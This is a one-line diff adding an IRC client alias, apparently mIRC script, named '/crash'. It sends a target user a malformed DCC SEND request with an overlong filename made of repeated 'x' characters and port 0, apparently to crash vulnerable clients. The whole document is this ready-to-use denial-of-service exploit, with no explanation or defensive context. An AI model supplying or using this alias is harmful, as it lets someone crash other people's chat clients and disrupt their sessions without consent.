@@ -1,0 +1,1 @@
+/crash { raw PRIVMSG $$1 :DCC SEND "x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x" 0 }
